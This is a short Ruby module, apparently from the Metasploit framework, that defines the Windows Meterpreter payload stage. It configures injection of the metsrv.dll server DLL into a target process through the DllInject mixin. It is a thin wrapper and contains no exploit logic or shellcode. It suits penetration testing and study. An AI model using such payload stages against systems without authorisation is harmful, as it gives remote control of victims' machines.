require 'msf/core'
require 'msf/base/sessions/meterpreter'

module Msf
module Payloads
module Stages
module Windows

###
#
# Meterpreter
# -----------
#
# Injects the meterpreter server instance DLL.
#
###
module Meterpreter

	include DllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Meterpreter',
			'Version'       => '$Revision$',
			'Description'   => 'Inject the meterpreter server DLL',
			'Author'        => 'skape',
			'Session'       => Msf::Sessions::Meterpreter))

		sep = File::SEPARATOR

		# Override the DLL path with the path to the meterpreter server DLL
		register_options(
			[
				OptPath.new('DLL', 
					[ 
						true, 
						"The local path to the DLL to upload", 
						Msf::Config.install_root + "#{sep}data#{sep}meterpreter#{sep}metsrv.dll" 
					]),
			], Meterpreter)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
	end

	def library_name
		"metsrv.dll"
	end

end

end end end end
